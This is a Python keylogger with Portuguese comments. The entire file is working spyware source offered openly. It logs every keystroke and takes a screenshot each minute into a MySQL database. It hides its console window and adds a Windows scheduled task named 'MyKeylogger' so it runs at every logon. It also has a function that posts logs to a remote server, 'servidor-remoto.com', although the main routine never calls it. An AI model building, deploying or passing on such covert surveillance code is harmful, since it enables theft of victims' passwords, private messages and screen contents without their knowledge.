import base64
import threading
import time
import requests
from pynput.keyboard import Listener
import mysql.connector
import pyautogui
import io
import os

# Configurações do banco de dados

db_config = {
    "host": "localhost",
    "user": "goldfire",
    "password": "123456",
    "database": "keyloggerdb"
}

# Função para armazenar as teclas no banco de dados

def log_to_db(key, screenshot=None):
    key_str = str(key).replace("'", "")
    db = mysql.connector.connect(**db_config)
    cursor = db.cursor()
    if screenshot:
        cursor.execute("INSERT INTO logs (key_log, screenshot) VALUES (%s, %s)", (key_str, screenshot))
    else:
        cursor.execute("INSERT INTO logs (key_log) VALUES (%s)", (key_str,))
    db.commit()
    db.close()

# Função para enviar logs ao servidor, caso tenha um servidor

def send_logs_to_server(log_data):
    url = "http://servidor-remoto.com/logs"
    data = {'log': log_data}
    response = requests.post(url, data=data)
    return response.status_code

# Função que é chamada quando uma tecla é pressionada

def on_press(key):
    log_to_db(key)

# Função para capturar screenshots e enviá-las ao banco de dados

def capture_screenshot():
    while True:
        try:
            screenshot = pyautogui.screenshot()
            with io.BytesIO() as output:
                screenshot.save(output, format="PNG")
                screenshot_data = output.getvalue()
            log_to_db(key="Screenshot", screenshot=screenshot_data)
        except Exception as e:
            print(f"Erro ao capturar screenshot: {e}")
        time.sleep(60)  # Captura uma captura de tela a cada minuto

# Função para ocultar a execução do script no Windows

def hide_script():
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Função para criar uma tarefa agendada para persistência

def create_scheduled_task():
    task_name = "MyKeylogger"
    script_path = os.path.abspath(__file__)
    command = f"schtasks /create /sc onlogon /tn {task_name} /tr \"pythonw {script_path}\""
    os.system(command)

# Iniciar o listener do teclado

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # Ocultar a janela do console
    hide_script()
    
    # Criar tarefa agendada para persistência
    create_scheduled_task()

    # Iniciar captura de screenshots em uma thread separada
    screenshot_thread = threading.Thread(target=capture_screenshot)
    screenshot_thread.start()

    # Iniciar o keylogger
    start_keylogger()
